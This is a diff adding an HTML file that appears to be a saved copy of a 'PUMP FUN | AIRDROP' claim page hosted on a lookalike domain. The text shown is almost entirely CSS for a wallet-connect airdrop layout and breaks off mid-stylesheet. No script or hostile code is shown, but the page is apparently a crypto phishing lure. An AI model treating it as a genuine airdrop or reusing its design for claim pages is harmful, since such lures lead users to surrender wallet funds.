@@ -1,0 +1,1375 @@
+<!DOCTYPE html><html><head><base>
+		<meta charset="UTF-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0">
+		<title>PUMP FUN | AIRDROP</title>
+		
+		
+		<link href="css2" rel="stylesheet">
+				
+						<link href="40f4ea95-fbfd-441a-acb3-18cd07317480.png" rel="icon" type="image/png">
+				<style>
+			* {
+				margin: 0;
+				padding: 0;
+				box-sizing: border-box;
+			}
+
+			body {
+				font-family: 'Manrope', -apple-system, BlinkMacSystemFont, 'Segoe UI',
+					Roboto, sans-serif;
+				background-color: #15161b;
+				background-image: url("urn:scrapbook:download:error:https://rewardspump.fun/l/-c--pumpfunclaim-1f707/images/bg.png");
+				background-size: cover;
+				background-position: center;
+				background-repeat: no-repeat;
+				background-attachment: fixed;
+				color: #ffffff;
+				min-height: 100vh;
+			}
+
+			.container {
+				max-width: 1200px;
+				margin: 0 auto;
+				padding: 0 20px;
+			}
+
+			/* Header */
+			.header {
+				background-color: rgba(255, 255, 255, 0.05);
+				backdrop-filter: blur(10px);
+				border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+				position: sticky;
+				top: 0;
+				z-index: 100;
+				transition: all 0.3s ease;
+			}
+
+			.header-content {
+				display: flex;
+				align-items: center;
+				justify-content: space-between;
+				padding: 20px 0;
+			}
+
+			.header-left {
+				display: flex;
+				align-items: center;
+				gap: 30px;
+			}
+
+			.price-ticker {
+				display: flex;
+				align-items: center;
+				gap: 8px;
+				background: rgba(255, 255, 255, 0.05);
+				border: 1px solid rgba(255, 255, 255, 0.1);
+				border-radius: 8px;
+				padding: 8px 16px;
+				backdrop-filter: blur(10px);
+			}
+
+			.price-label {
+				color: rgba(255, 255, 255, 0.7);
+				font-size: 12px;
+				font-weight: 500;
+				text-transform: uppercase;
+			}
+
+			.price-value {
+				color: #ffffff;
+				font-size: 14px;
+				font-weight: 600;
+				min-width: 60px;
+			}
+
+			.price-change {
+				font-size: 12px;
+				font-weight: 500;
+				padding: 2px 6px;
+				border-radius: 4px;
+				min-width: 45px;
+				text-align: center;
+			}
+
+			.price-change.positive {
+				color: #83efaa;
+				background: rgba(131, 239, 170, 0.1);
+			}
+
+			.price-change.negative {
+				color: #ff6b6b;
+				background: rgba(255, 107, 107, 0.1);
+			}
+
+			.logo {
+				display: flex;
+				align-items: center;
+				gap: 12px;
+				text-decoration: none;
+				color: #ffffff;
+				font-size: 24px;
+				font-weight: 700;
+			}
+
+			.logo img {
+				width: 40px;
+				height: 40px;
+			}
+
+			.header-right {
+				display: flex;
+				align-items: center;
+				gap: 20px;
+			}
+
+			.social-links {
+				display: flex;
+				align-items: center;
+				gap: 16px;
+			}
+
+			.social-link {
+				display: flex;
+				align-items: center;
+				justify-content: center;
+				width: 40px;
+				height: 40px;
+				color: rgba(255, 255, 255, 0.7);
+				border-radius: 8px;
+				transition: all 0.3s ease;
+				text-decoration: none;
+				background: rgba(255, 255, 255, 0.05);
+				border: 1px solid rgba(255, 255, 255, 0.1);
+			}
+
+			.social-link:hover {
+				color: #83efaa;
+				background: rgba(131, 239, 170, 0.1);
+				border-color: rgba(131, 239, 170, 0.3);
+				transform: translateY(-2px);
+			}
+
+			.claim-button {
+				background: linear-gradient(135deg, #83efaa, #6bc790);
+				color: #15161b;
+				border: none;
+				padding: 12px 32px;
+				border-radius: 8px;
+				font-size: 16px;
+				font-weight: 600;
+				cursor: pointer;
+				transition: all 0.3s ease;
+				text-decoration: none;
+				display: inline-block;
+				position: relative;
+				overflow: hidden;
+			}
+
+			.claim-button::before {
+				content: '';
+				position: absolute;
+				top: 0;
+				left: -100%;
+				width: 100%;
+				height: 100%;
+				background: linear-gradient(
+					90deg,
+					transparent,
+					rgba(255, 255, 255, 0.2),
+					transparent
+				);
+				transition: left 0.5s ease;
+			}
+
+			.claim-button:hover::before {
+				left: 100%;
+			}
+
+			.claim-button:hover {
+				transform: translateY(-2px);
+				box-shadow: 0 8px 25px rgba(131, 239, 170, 0.3);
+			}
+
+			.claim-button:active {
+				transform: translateY(0);
+			}
+
+			/* Hero Section */
+			.hero {
+				padding: 80px 0 120px;
+				display: flex;
+				align-items: flex-start;
+			}
+
+			.hero-wrapper {
+				display: flex;
+				align-items: flex-start;
+				gap: 80px;
+			}
+
+			.hero-content {
+				flex: 1;
+				text-align: left;
+			}
+
+			.hero-illustration {
+				flex: 1;
+				display: flex;
+				justify-content: center;
+				align-items: flex-start;
+				position: relative;
+			}
+
+			.hero-image {
+				max-width: 100%;
+				height: auto;
+				border-radius: 20px;
+				transition: transform 0.3s ease;
+				animation: float 4s linear infinite;
+			}
+
+			.hero-image:hover {
+				animation-play-state: paused;
+				transform: scale(1.05) translateY(-5px);
+			}
+
+			@keyframes float {
+				0% {
+					transform: translateY(0px);
+				}
+				25% {
+					transform: translateY(-5px);
+				}
+				50% {
+					transform: translateY(-10px);
+				}
+				75% {
+					transform: translateY(-5px);
+				}
+				100% {
+					transform: translateY(0px);
+				}
+			}
+
+			.hero-badge {
+				display: inline-block;
+				background: rgba(131, 239, 170, 0.15);
+				border: 1px solid rgba(131, 239, 170, 0.3);
+				padding: 8px 20px;
+				border-radius: 50px;
+				margin-bottom: 24px;
+				backdrop-filter: blur(10px);
+			}
+
+			.hero-badge span {
+				color: #83efaa;
+				font-size: 14px;
+				font-weight: 600;
+			}
+
+			.hero-title {
+				font-size: 48px;
+				font-weight: 700;
+				line-height: 1.1;
+				margin-bottom: 24px;
+				color: #ffffff;
+			}
+
+			.highlight {
+				color: #83efaa;
+				background: linear-gradient(135deg, #83efaa, #6bc790);
+				-webkit-background-clip: text;
+				-webkit-text-fill-color: transparent;
+				background-clip: text;
+			}
+
+			.hero-description {
+				font-size: 18px;
+				line-height: 1.6;
+				color: rgba(255, 255, 255, 0.8);
+				margin-bottom: 40px;
+			}
+
+			.hero-buttons {
+				display: flex;
+				gap: 20px;
+				justify-content: flex-start;
+				align-items: center;
+				flex-wrap: wrap;
+			}
+
+			.claim-button-hero {
+				background: linear-gradient(135deg, #83efaa, #6bc790);
+				color: #15161b;
+				border: none;
+				padding: 16px 40px;
+				border-radius: 8px;
+				font-size: 16px;
+				font-weight: 600;
+				cursor: pointer;
+				transition: all 0.3s ease;
+				text-decoration: none;
+				display: inline-block;
+				position: relative;
+				overflow: hidden;
+			}
+
+			.claim-button-hero::before {
+				content: '';
+				position: absolute;
+				top: 0;
+				left: -100%;
+				width: 100%;
+				height: 100%;
+				background: linear-gradient(
+					90deg,
+					transparent,
+					rgba(255, 255, 255, 0.2),
+					transparent
+				);
+				transition: left 0.5s ease;
+			}
+
+			.claim-button-hero:hover::before {
+				left: 100%;
+			}
+
+			.claim-button-hero:hover {
+				transform: translateY(-2px);
+				box-shadow: 0 8px 25px rgba(131, 239, 170, 0.3);
+			}
+
+			.learn-button {
+				background: transparent;
+				color: #ffffff;
+				border: 2px solid rgba(255, 255, 255, 0.2);
+				padding: 16px 40px;
+				border-radius: 8px;
+				font-size: 16px;
+				font-weight: 500;
+				cursor: pointer;
+				transition: all 0.3s ease;
+				text-decoration: none;
+				display: inline-block;
+			}
+
+			.learn-button:hover {
+				border-color: #83efaa;
+				color: #83efaa;
+				transform: translateY(-2px);
+			}
+
+			/* Mobile responsive */
+			@media (max-width: 768px) {
+				.header-content {
+					flex-direction: row;
+					justify-content: space-between;
+					align-items: center;
+					gap: 16px;
+					padding: 16px 0;
+				}
+
+				.header-left {
+					flex-direction: row;
+					gap: 16px;
+					align-items: center;
+					flex: 1;
+				}
+
+				.logo {
+					font-size: 20px;
+				}
+
+				.logo img {
+					width: 32px;
+					height: 32px;
+				}
+
+				.price-ticker {
+					padding: 4px 8px;
+					gap: 6px;
+					min-width: auto;
+				}
+
+				.price-label {
+					font-size: 10px;
+				}
+
+				.price-value {
+					font-size: 12px;
+					min-width: 50px;
+				}
+
+				.price-change {
+					font-size: 10px;
+					padding: 1px 4px;
+					min-width: 35px;
+				}
+
+				.header-right {
+					gap: 12px;
+					flex-shrink: 0;
+				}
+
+				.social-links {
+					gap: 8px;
+				}
+
+				.social-link {
+					width: 32px;
+					height: 32px;
+				}
+
+				.social-link svg {
+					width: 16px;
+					height: 16px;
+				}
+
+				.claim-button {
+					padding: 8px 16px;
+					font-size: 12px;
+					white-space: nowrap;
+				}
+			}
+
+			/* Extra small mobile */
+			@media (max-width: 480px) {
+				.header-content {
+					flex-direction: column;
+					gap: 12px;
+					padding: 12px 0;
+				}
+
+				.header-left {
+					width: 100%;
+					justify-content: space-between;
+				}
+
+				.logo {
+					font-size: 18px;
+				}
+
+				.price-ticker {
+					padding: 4px 6px;
+				}
+
+				.price-value {
+					font-size: 11px;
+					min-width: 45px;
+				}
+
+				.price-change {
+					font-size: 9px;
+					min-width: 30px;
+				}
+
+				.header-right {
+					width: 100%;
+					justify-content: space-between;
+					align-items: center;
+				}
+
+				.social-links {
+					gap: 6px;
+				}
+
+				.social-link {
+					width: 30px;
+					height: 30px;
+				}
+
+				.social-link svg {
+					width: 14px;
+					height: 14px;
+				}
+
+				.claim-button {
+					padding: 8px 20px;
+					font-size: 12px;
+					flex: 1;
+					text-align: center;
+					max-width: 120px;
+				}
+			}
+
+			/* Mobile responsive for hero section */
+			@media (max-width: 768px) {
+				.hero {
+					padding: 60px 0 80px;
+				}
+
+				.hero-wrapper {
+					flex-direction: column;
+					gap: 40px;
+				}
+
+				.hero-content {
+					text-align: center;
+				}
+
+				.hero-illustration {
+					order: -1;
+				}
+
+				.hero-image {
+					max-width: 70%;
+					height: auto;
+				}
+
+				.hero-title {
+					font-size: 36px;
+				}
+
+				.hero-description {
+					font-size: 16px;
+					max-width: 100%;
+				}
+
+				.hero-buttons {
+					justify-content: center;
+					flex-direction: column;
+					gap: 16px;
+				}
+
+				.claim-button-hero,
+				.learn-button {
+					width: 100%;
+					text-align: center;
+				}
+
+				/* About Airdrop Mobile */
+				.about-airdrop {
+					padding: 0 0 60px 0;
+				}
+
+				.about-title {
+					font-size: 32px;
+				}
+
+				.about-description {
+					font-size: 16px;
+					margin-bottom: 40px;
+				}
+
+				.airdrop-stats {
+					flex-direction: column;
+					gap: 30px;
+					margin-bottom: 40px;
+				}
+
+				.stat-number {
+					font-size: 28px;
+				}
+
+				.eligibility-info {
+					padding: 24px;
+					margin-bottom: 30px;
+				}
+
+				.eligibility-title {
+					font-size: 20px;
+				}
+
+				.eligibility-wrapper {
+					flex-direction: column;
+					gap: 20px;
+				}
+
+				.eligibility-list li {
+					font-size: 14px;
+					padding-left: 35px;
+				}
+
+				.eligibility-image {
+					max-width: 200px;
+					height: auto;
+				}
+
+				.connect-text {
+					font-size: 16px;
+				}
+
+				.connect-wallet-btn {
+					width: 100%;
+					padding: 14px 20px;
+				}
+			}
+
+			/* About Airdrop Section */
+			.about-airdrop {
+				padding: 0 0 80px 0;
+			}
+
+			.about-content {
+				max-width: 800px;
+				margin: 0 auto;
+				text-align: center;
+			}
+
+			.about-title {
+				font-size: 42px;
+				font-weight: 700;
+				color: #ffffff;
+				margin-bottom: 24px;
+				line-height: 1.1;
+			}
+
+			.about-description {
+				font-size: 18px;
+				line-height: 1.6;
+				color: rgba(255, 255, 255, 0.8);
+				margin-bottom: 50px;
+			}
+
+			.airdrop-stats {
+				display: flex;
+				justify-content: center;
+				gap: 60px;
+				margin-bottom: 50px;
+			}
+
+			.stat-item {
+				text-align: center;
+			}
+
+			.stat-number {
+				display: block;
+				font-size: 36px;
+				font-weight: 700;
+				color: #83efaa;
+				margin-bottom: 8px;
+			}
+
+			.stat-label {
+				font-size: 14px;
+				color: rgba(255, 255, 255, 0.7);
+				text-transform: uppercase;
+				letter-spacing: 1px;
+			}
+
+			.eligibility-info {
+				text-align: left;
+				background: rgba(255, 255, 255, 0.05);
+				border: 1px solid rgba(255, 255, 255, 0.1);
+				border-radius: 16px;
+				padding: 32px;
+				margin-bottom: 40px;
+				backdrop-filter: blur(10px);
+			}
+
+			.eligibility-title {
+				font-size: 24px;
+				font-weight: 600;
+				color: #ffffff;
+				margin-bottom: 20px;
+				text-align: center;
+			}
+
+			.eligibility-list {
+				list-style: none;
+				padding: 0;
+				flex: 1;
+			}
+
+			.eligibility-list li {
+				padding: 12px 0;
+				color: rgba(255, 255, 255, 0.8);
+				font-size: 16px;
+				position: relative;
+				padding-left: 30px;
+			}
+
+			.eligibility-list li::before {
+				content: '✓';
+				position: absolute;
+				left: 0;
+				color: #83efaa;
+				font-weight: bold;
+				font-size: 18px;
+			}
+
+			.eligibility-wrapper {
+				display: flex;
+				gap: 40px;
+				align-items: center;
+			}
+
+			.eligibility-illustration {
+				flex: 1;
+				display: flex;
+				justify-content: center;
+				align-items: center;
+				max-width: 300px;
+			}
+
+			.eligibility-image {
+				max-width: 250px;
+				height: auto;
+				border-radius: 12px;
+				transition: transform 0.3s ease;
+			}
+
+			.eligibility-image:hover {
+				transform: scale(1.05);
+			}
+
+			.connect-section {
+				text-align: center;
+			}
+
+			.connect-text {
+				font-size: 18px;
+				color: rgba(255, 255, 255, 0.8);
+				margin-bottom: 24px;
+			}
+
+			.connect-wallet-btn {
+				background: linear-gradient(135deg, #83efaa, #6bc790);
+				color: #15161b;
+				border: none;
+				padding: 16px 40px;
+				border-radius: 8px;
+				font-size: 16px;
+				font-weight: 600;
+				cursor: pointer;
+				transition: all 0.3s ease;
+				position: relative;
+				overflow: hidden;
+			}
+
+			.connect-wallet-btn::before {
+				content: '';
+				position: absolute;
+				top: 0;
+				left: -100%;
+				width: 100%;
+				height: 100%;
+				background: linear-gradient(
+					90deg,
+					transparent,
+					rgba(255, 255, 255, 0.2),
+					transparent
+				);
+				transition: left 0.5s ease;
+			}
+
+			.connect-wallet-btn:hover::before {
+				left: 100%;
+			}
+
+			.connect-wallet-btn:hover {
+				transform: translateY(-2px);
+				box-shadow: 0 8px 25px rgba(131, 239, 170, 0.3);
+			}
+
+			/* Extra small mobile */
+			@media (max-width: 480px) {
+				.hero-image {
+					max-width: 60%;
+					height: auto;
+				}
+
+				.about-airdrop {
+					padding: 0 0 40px 0;
+				}
+
+				.about-title {
+					font-size: 28px;
+				}
+
+				.about-description {
+					font-size: 14px;
+				}
+
+				.airdrop-stats {
+					gap: 20px;
+				}
+
+				.stat-number {
+					font-size: 24px;
+				}
+
+				.stat-label {
+					font-size: 12px;
+				}
+
+				.eligibility-info {
+					padding: 20px;
+				}
+
+				.eligibility-title {
+					font-size: 18px;
+				}
+
+				.eligibility-wrapper {
+					flex-direction: column;
+					gap: 16px;
+				}
+
+				.eligibility-list li {
+					font-size: 13px;
+					padding: 8px 0;
+					padding-left: 35px;
+				}
+
+				.eligibility-image {
+					max-width: 180px;
+					height: auto;
+				}
+
+				.connect-text {
+					font-size: 14px;
+				}
+
+				.connect-wallet-btn {
+					font-size: 14px;
+					padding: 12px 16px;
+				}
+			}
+
+			/* Footer */
+			.footer {
+				background: rgba(255, 255, 255, 0.05);
+				backdrop-filter: blur(10px);
+				border-top: 1px solid rgba(255, 255, 255, 0.1);
+				margin-top: 80px;
+			}
+
+			.footer-content {
+				display: flex;
+				justify-content: space-between;
+				gap: 80px;
+				padding: 60px 0 40px;
+			}
+
+			.footer-brand {
+				flex: 1;
+				max-width: 400px;
+			}
+
+			.footer-logo {
+				display: flex;
+				align-items: center;
+				gap: 12px;
+				text-decoration: none;
+				color: #ffffff;
+				font-size: 20px;
+				font-weight: 700;
+				margin-bottom: 16px;
+			}
+
+			.footer-logo img {
+				width: 32px;
+				height: 32px;
+			}
+
+			.footer-description {
+				color: rgba(255, 255, 255, 0.6);
+				font-size: 14px;
+				line-height: 1.6;
+				margin: 0 0 24px 0;
+			}
+
+			.footer-social {
+				display: flex;
+				gap: 16px;
+			}
+
+			.footer-social-link {
+				display: flex;
+				align-items: center;
+				justify-content: center;
+				width: 40px;
+				height: 40px;
+				color: rgba(255, 255, 255, 0.6);
+				border-radius: 8px;
+				transition: all 0.3s ease;
+				text-decoration: none;
+				background: rgba(255, 255, 255, 0.05);
+				border: 1px solid rgba(255, 255, 255, 0.1);
+			}
+
+			.footer-social-link:hover {
+				color: #83efaa;
+				background: rgba(131, 239, 170, 0.1);
+				border-color: rgba(131, 239, 170, 0.3);
+				transform: translateY(-2px);
+			}
+
+			.footer-links {
+				display: flex;
+				gap: 60px;
+				flex: 2;
+			}
+
+			.footer-column {
+				flex: 1;
+			}
+
+			.footer-title {
+				color: #ffffff;
+				font-size: 16px;
+				font-weight: 600;
+				margin-bottom: 20px;
+			}
+
+			.footer-menu {
+				list-style: none;
+				padding: 0;
+				margin: 0;
+			}
+
+			.footer-menu li {
+				margin-bottom: 12px;
+			}
+
+			.footer-menu a {
+				color: rgba(255, 255, 255, 0.6);
+				text-decoration: none;
+				font-size: 14px;
+				transition: color 0.3s ease;
+			}
+
+			.footer-menu a:hover {
+				color: #83efaa;
+			}
+
+			.footer-bottom {
+				border-top: 1px solid rgba(255, 255, 255, 0.1);
+				padding: 20px 0;
+			}
+
+			.footer-bottom-content {
+				display: flex;
+				justify-content: space-between;
+				align-items: center;
+			}
+
+			.footer-copyright {
+				color: rgba(255, 255, 255, 0.5);
+				font-size: 12px;
+				margin: 0;
+			}
+
+			.footer-stats {
+				display: flex;
+				gap: 40px;
+			}
+
+			.footer-stat {
+				text-align: center;
+				display: flex;
+				flex-direction: column;
+				gap: 4px;
+			}
+
+			.footer-stat .stat-value {
+				color: #83efaa;
+				font-size: 16px;
+				font-weight: 600;
+			}
+
+			.footer-stat .stat-label {
+				color: rgba(255, 255, 255, 0.5);
+				font-size: 11px;
+				text-transform: uppercase;
+				letter-spacing: 0.5px;
+			}
+
+			/* Footer Mobile */
+			@media (max-width: 768px) {
+				.footer-content {
+					flex-direction: column;
+					gap: 40px;
+					padding: 40px 0;
+				}
+
+				.footer-brand {
+					max-width: 100%;
+					text-align: center;
+				}
+
+				.footer-logo {
+					justify-content: center;
+					font-size: 18px;
+				}
+
+				.footer-logo img {
+					width: 28px;
+					height: 28px;
+				}
+
+				.footer-description {
+					text-align: center;
+				}
+
+				.footer-social {
+					justify-content: center;
+					gap: 12px;
+				}
+
+				.footer-social-link {
+					width: 36px;
+					height: 36px;
+				}
+
+				.footer-links {
+					flex-direction: column;
+					gap: 30px;
+					align-items: center;
+				}
+
+				.footer-column {
+					text-align: center;
+					width: 100%;
+				}
+
+				.footer-title {
+					font-size: 15px;
+				}
+
+				.footer-menu a {
+					font-size: 13px;
+				}
+
+				.footer-bottom-content {
+					flex-direction: column;
+					gap: 20px;
+					text-align: center;
+				}
+
+				.footer-stats {
+					gap: 30px;
+				}
+
+				.footer-stat .stat-value {
+					font-size: 14px;
+				}
+
+				.footer-stat .stat-label {
+					font-size: 10px;
+				}
+			}
+
+			@media (max-width: 480px) {
+				.footer-content {
+					gap: 30px;
+					padding: 30px 0;
+				}
+
+				.footer-logo {
+					font-size: 16px;
+				}
+
+				.footer-logo img {
+					width: 24px;
+					height: 24px;
+				}
+
+				.footer-description {
+					font-size: 13px;
+				}
+
+				.footer-social {
+					gap: 10px;
+				}
+
+				.footer-social-link {
+					width: 32px;
+					height: 32px;
+				}
+
+				.footer-social-link svg {
+					width: 16px;
+					height: 16px;
+				}
+
+				.footer-links {
+					gap: 20px;
+					align-items: center;
+				}
+
+				.footer-column {
+					text-align: center;
+					width: 100%;
+				}
+
+				.footer-title {
+					font-size: 14px;
+				}
+
+				.footer-menu a {
+					font-size: 12px;
+				}
+
+				.footer-bottom-content {
+					gap: 16px;
+				}
+
+				.footer-stats {
+					gap: 20px;
+				}
+
+				.footer-stat .stat-value {
+					font-size: 13px;
+				}
+
+				.footer-stat .stat-label {
+					font-size: 9px;
+				}
+
+				.footer-copyright {
+					font-size: 11px;
+				}
+			}
+		</style><style>@import url("css2.css");@keyframes w3m-shake {0% {transform:scale(1) rotate(0deg)}20% {transform:scale(1) rotate(-1deg)}40% {transform:scale(1) rotate(1.5deg)}60% {transform:scale(1) rotate(-1.5deg)}80% {transform:scale(1) rotate(1deg)}100% {transform:scale(1) rotate(0deg)}}@keyframes w3m-iframe-fade-out {0% {opacity:1}100% {opacity:0}}@keyframes w3m-iframe-zoom-in {0% {transform:translateY(50px);opacity:0}100% {transform:translateY(0px);opacity:1}}@keyframes w3m-iframe-zoom-in-mobile {0% {transform:scale(0.95);opacity:0}100% {transform:scale(1);opacity:1}}:root {--w3m-modal-width:360px;--w3m-color-mix-strength:0%;--w3m-font-family:Inter, Segoe UI, Roboto, Oxygen, Ubuntu, Cantarell, Fira Sans, Droid Sans, Helvetica Neue, sans-serif;;--w3m-font-size-master:10px;--w3m-border-radius-master:4px;--w3m-z-index:99999;--wui-font-family:var(--w3m-font-family);--wui-font-size-mini:calc(var(--w3m-font-size-master) * 0.8);--wui-font-size-micro:var(--w3m-font-size-master);--wui-font-size-tiny:calc(var(--w3m-font-size-master) * 1.2);--wui-font-size-small:calc(var(--w3m-font-size-master) * 1.4);--wui-font-size-paragraph:calc(var(--w3m-font-size-master) * 1.6);--wui-font-size-medium:calc(var(--w3m-font-size-master) * 1.8);--wui-font-size-large:calc(var(--w3m-font-size-master) * 2);--wui-font-size-title-6:calc(var(--w3m-font-size-master) * 2.2);--wui-font-size-medium-title:calc(var(--w3m-font-size-master) * 2.4);--wui-font-size-2xl:calc(var(--w3m-font-size-master) * 4);--wui-border-radius-5xs:var(--w3m-border-radius-master);--wui-border-radius-4xs:calc(var(--w3m-border-radius-master) * 1.5);--wui-border-radius-3xs:calc(var(--w3m-border-radius-master) * 2);--wui-border-radius-xxs:calc(var(--w3m-border-radius-master) * 3);--wui-border-radius-xs:calc(var(--w3m-border-radius-master) * 4);--wui-border-radius-s:calc(var(--w3m-border-radius-master) * 5);--wui-border-radius-m:calc(var(--w3m-border-radius-master) * 7);--wui-border-radius-l:calc(var(--w3m-border-radius-master) * 9);--wui-border-radius-3xl:calc(var(--w3m-border-radius-master) * 20);--wui-font-weight-light:400;--wui-font-weight-regular:500;--wui-font-weight-medium:600;--wui-font-weight-bold:700;--wui-letter-spacing-2xl:-1.6px;--wui-letter-spacing-medium-title:-0.96px;--wui-letter-spacing-title-6:-0.88px;--wui-letter-spacing-large:-0.8px;--wui-letter-spacing-medium:-0.72px;--wui-letter-spacing-paragraph:-0.64px;--wui-letter-spacing-small:-0.56px;--wui-letter-spacing-tiny:-0.48px;--wui-letter-spacing-micro:-0.2px;--wui-letter-spacing-mini:-0.16px;--wui-spacing-0:0px;--wui-spacing-4xs:2px;--wui-spacing-3xs:4px;--wui-spacing-xxs:6px;--wui-spacing-2xs:7px;--wui-spacing-xs:8px;--wui-spacing-1xs:10px;--wui-spacing-s:12px;--wui-spacing-m:14px;--wui-spacing-l:16px;--wui-spacing-2l:18px;--wui-spacing-xl:20px;--wui-spacing-xxl:24px;--wui-spacing-2xl:32px;--wui-spacing-3xl:40px;--wui-spacing-3-5xl:72px;--wui-spacing-4xl:90px;--wui-spacing-5xl:95px;--wui-icon-box-size-xxs:14px;--wui-icon-box-size-xs:20px;--wui-icon-box-size-sm:24px;--wui-icon-box-size-md:32px;--wui-icon-box-size-mdl:36px;--wui-icon-box-size-lg:40px;--wui-icon-box-size-2lg:48px;--wui-icon-box-size-xl:64px;--wui-icon-size-inherit:inherit;--wui-icon-size-xxs:10px;--wui-icon-size-xs:12px;--wui-icon-size-sm:14px;--wui-icon-size-md:16px;--wui-icon-size-mdl:18px;--wui-icon-size-lg:20px;--wui-icon-size-xl:24px;--wui-icon-size-xxl:28px;--wui-wallet-image-size-inherit:inherit;--wui-wallet-image-size-sm:40px;--wui-wallet-image-size-md:56px;--wui-wallet-image-size-lg:80px;--wui-visual-size-size-inherit:inherit;--wui-visual-size-sm:40px;--wui-visual-size-md:55px;--wui-visual-size-lg:80px;--wui-box-size-md:100px;--wui-box-size-lg:120px;--wui-ease-out-power-2:cubic-bezier(0, 0, 0.22, 1);--wui-ease-out-power-1:cubic-bezier(0, 0, 0.55, 1);--wui-ease-in-power-3:cubic-bezier(0.66, 0, 1, 1);--wui-ease-in-power-2:cubic-bezier(0.45, 0, 1, 1);--wui-ease-in-power-1:cubic-bezier(0.3, 0, 1, 1);--wui-ease-inout-power-1:cubic-bezier(0.45, 0, 0.55, 1);--wui-duration-lg:200ms;--wui-duration-md:125ms;--wui-duration-sm:75ms;--wui-path-network-sm:path('M15.4 2.1a5.21 5.21 0 0 1 5.2 0l11.61 6.7a5.21 5.21 0 0 1 2.61 4.52v13.4c0 1.87-1 3.59-2.6 4.52l-11.61 6.7c-1.62.93-3.6.93-5.22 0l-11.6-6.7a5.21 5.21 0 0 1-2.61-4.51v-13.4c0-1.87 1-3.6 2.6-4.52L15.4 2.1Z');--wui-path-network-md:path('M43.4605 10.7248L28.0485 1.61089C25.5438 0.129705 22.4562 0.129705 19.9515 1.61088L4.53951 10.7248C2.03626 12.2051 0.5 14.9365 0.5 17.886V36.1139C0.5 39.0635 2.03626 41.7949 4.53951 43.2752L19.9515 52.3891C22.4562 53.8703 25.5438 53.8703 28.0485 52.3891L43.4605 43.2752C45.9637 41.7949 47.5 39.0635 47.5 36.114V17.8861C47.5 14.9365 45.9637 12.2051 43.4605 10.7248Z');--wui-path-network-lg:path('M78.3244 18.926L50.1808 2.45078C45.7376 -0.150261 40.2624 -0.150262 35.8192 2.45078L7.6756 18.926C3.23322 21.5266 0.5 26.3301 0.5 31.5248V64.4752C0.5 69.6699 3.23322 74.4734 7.6756 77.074L35.8192 93.5492C40.2624 96.1503 45.7376 96.1503 50.1808 93.5492L78.3244 77.074C82.7668 74.4734 85.5 69.6699 85.5 64.4752V31.5248C85.5 26.3301 82.7668 21.5266 78.3244 18.926Z');--wui-width-network-sm:36px;--wui-width-network-md:48px;--wui-width-network-lg:86px;--wui-height-network-sm:40px;--wui-height-network-md:54px;--wui-height-network-lg:96px;--wui-icon-size-network-xs:12px;--wui-icon-size-network-sm:16px;--wui-icon-size-network-md:24px;--wui-icon-size-network-lg:42px;--wui-color-inherit:inherit;--wui-color-inverse-100:#fff;--wui-color-inverse-000:#000;--wui-cover:rgba(20, 20, 20, 0.8);--wui-color-modal-bg:var(--wui-color-modal-bg-base);--wui-color-accent-100:var(--wui-color-accent-base-100);--wui-color-accent-090:var(--wui-color-accent-base-090);--wui-color-accent-080:var(--wui-color-accent-base-080);--wui-color-success-100:var(--wui-color-success-base-100);--wui-color-success-125:var(--wui-color-success-base-125);--wui-color-warning-100:var(--wui-color-warning-base-100);--wui-color-error-100:var(--wui-color-error-base-100);--wui-color-error-110:#f05142;--wui-color-error-125:var(--wui-color-error-base-125);--wui-color-blue-100:var(--wui-color-blue-base-100);--wui-color-blue-90:var(--wui-color-blue-base-90);--wui-icon-box-bg-error-100:var(--wui-icon-box-bg-error-base-100);--wui-icon-box-bg-blue-100:var(--wui-icon-box-bg-blue-base-100);--wui-icon-box-bg-success-100:var(--wui-icon-box-bg-success-base-100);--wui-icon-box-bg-inverse-100:var(--wui-icon-box-bg-inverse-base-100);--wui-all-wallets-bg-100:var(--wui-all-wallets-bg-100);--wui-avatar-border:var(--wui-avatar-border-base);--wui-thumbnail-border:var(--wui-thumbnail-border-base);--wui-wallet-button-bg:var(--wui-wallet-button-bg-base);--wui-box-shadow-blue:var(--wui-color-accent-glass-020)}@supports (background:color-mix(in srgb, white 50%, black)) {:root {--wui-color-modal-bg:color-mix(in srgb,var(--w3m-color-mix) var(--w3m-color-mix-strength),var(--wui-color-modal-bg-base));--wui-box-shadow-blue:color-mix(in srgb,var(--wui-color-accent-100) 20%,transparent);--wui-color-accent-100:color-mix(in srgb,var(--wui-color-accent-base-100) 100%,transparent);--wui-color-accent-090:color-mix(in srgb,var(--wui-color-accent-base-100) 90%,transparent);--wui-color-accent-080:color-mix(in srgb,var(--wui-color-accent-base-100) 80%,transparent);--wui-color-accent-glass-090:color-mix(in srgb,var(--wui-color-accent-base-100) 90%,transparent);--wui-color-accent-glass-080:color-mix(in srgb,var(--wui-color-accent-base-100) 80%,transparent);--wui-color-accent-glass-020:color-mix(in srgb,var(--wui-color-accent-base-100) 20%,transparent);--wui-color-accent-glass-015:color-mix(in srgb,var(--wui-color-accent-base-100) 15%,transparent);--wui-color-accent-glass-010:color-mix(in srgb,var(--wui-color-accent-base-100) 10%,transparent);--wui-color-accent-glass-005:color-mix(in srgb,var(--wui-color-accent-base-100) 5%,transparent);--wui-color-accent-002:color-mix(in srgb,var(--wui-color-accent-base-100) 2%,transparent);--wui-color-fg-100:color-mix(in srgb,var(--w3m-color-mix) var(--w3m-color-mix-strength),var(--wui-color-fg-100));--wui-color-fg-125:color-mix(in srgb,var(--w3m-color-mix) var(--w3m-color-mix-strength),var(--wui-color-fg-125));--wui-color-fg-150:color-mix(in srgb,var(--w3m-color-mix) var(--w3m-color-mix-strength),var(--wui-color-fg-150));--wui-color-fg-175:color-mix(in srgb,var(--w3m-color-mix) var(--w3m-color-mix-strength),var(--wui-color-fg-175));--wui-color-fg-200:color-mix(in srgb,var(--w3m-color-mix) var(--w3m-color-mix-strength),var(--wui-color-fg-200));--wui-color-fg-225:color-mix(in srgb,var(--w3m-color-mix) var(--w3m-color-mix-strength),var(--wui-color-fg-225));--wui-color-fg-250:color-mix(in srgb,var(--w3m-color-mix) var(--w3m-color-mix-strength),var(--wui-color-fg-250));--wui-color-fg-275:color-mix(in srgb,var(--w3m-color-mix) var(--w3m-color-mix-strength),var(--wui-color-fg-275));--wui-color-fg-300:color-mix(in srgb,var(--w3m-color-mix) var(--w3m-color-mix-strength),var(--wui-color-fg-300));--wui-color-fg-325:color-mix(in srgb,var(--w3m-color-mix) var(--w3m-color-mix-strength),var(--wui-color-fg-325));--wui-color-fg-350:color-mix(in srgb,var(--w3m-color-mix) 